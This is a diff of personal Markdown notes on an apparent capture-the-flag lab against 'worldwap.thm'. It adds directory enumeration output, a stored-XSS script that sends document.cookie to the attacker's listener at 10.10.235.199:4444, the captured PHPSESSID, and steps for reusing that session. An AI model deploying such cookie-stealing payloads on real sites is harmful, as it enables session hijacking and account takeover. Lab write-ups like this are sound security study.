@@ -11,7 +11,7 @@
 ##### **Conclusion**
 **Time :** 
 	**Start :** 25.03.2025 18:55
-	**Break at/to :** 25.03.2025 18:55 / 
+	**Break at/to :** 25.03.2025 19:14 / 25.03.2025 20:04
 	**Finish :** 
 **Satisfaction :**  
 ### 1. **Reconnaissance
@@ -83,24 +83,59 @@ We find some pages with #gobuster
 Output :
 
 ```BASH
-/.php                 (Status: 403) [Size: 277]
-/.html                (Status: 403) [Size: 277]
-/index.php            (Status: 200) [Size: 1797]
-/login.php            (Status: 200) [Size: 1785]
-/register.php         (Status: 200) [Size: 2188]
-/admin.php            (Status: 403) [Size: 0]
-/upload.php           (Status: 403) [Size: 0]
-/logout.php           (Status: 200) [Size: 154]
-/mod.php              (Status: 403) [Size: 0]
-/dashboard.php        (Status: 403) [Size: 0]
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.php                 (Status: 403) [Size: 279]
+/.html                (Status: 403) [Size: 279]
+/index.php            (Status: 200) [Size: 70]
+/login.php            (Status: 200) [Size: 3108]
+/profile.php          (Status: 302) [Size: 0] [--> login.php]
+/clear.php            (Status: 200) [Size: 4]
+/assets               (Status: 301) [Size: 320] [--> http://worldwap.thm:8081/assets/]
+/chat.php             (Status: 302) [Size: 0] [--> login.php]
+/db.php               (Status: 200) [Size: 0]
+/logout.php           (Status: 302) [Size: 0] [--> login.php]
+/setup.php            (Status: 200) [Size: 149]
+/block.php            (Status: 200) [Size: 15]
+/logs.txt             (Status: 200) [Size: 0]
+/phpmyadmin           (Status: 301) [Size: 324] [--> http://worldwap.thm:8081/phpmyadmin/]
+/change_password.php  (Status: 302) [Size: 4] [--> login.php]
+/server-status        (Status: 403) [Size: 279]
 ```
 
 ## 2. **Weaponization
 
+```JS
+<script>  
+var img = new Image();  
+img.src = ‘http://10.10.235.199:4444/stealcookies?’+ document.cookie;  
+</script>
+```
+
 ## 3. **Delivery
+
+![[Pasted image 20250325203616.png]]
+
+We enter this payloads for see if we can steal a user cookie. With an #XSS
 
 ## 4. **Exploitation
 
+With our exploit with the #XSS doesn't work.
+But after a few second a PHPSESSID just appear.
+
+```BASH
+root@ip-10-10-235-199:~# python3 -m http.server 4444
+Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
+10.10.53.234 - - [25/Mar/2025 19:38:03] code 404, message File not found
+10.10.53.234 - - [25/Mar/2025 19:38:03] "GET /stealcookies?PHPSESSID=16qkgn0k0sehun9gjmsiiedthj HTTP/1.1" 404 -
+```
+
+And by changing ou PHPSESSID and go to `dashboard.php` it's show this :
+![[Pasted image 20250325204238.png]]
+
+
+On the page `mod.php` we can activate our account.
 ## 5. **Installation
 
 ## 6. **Command and Control
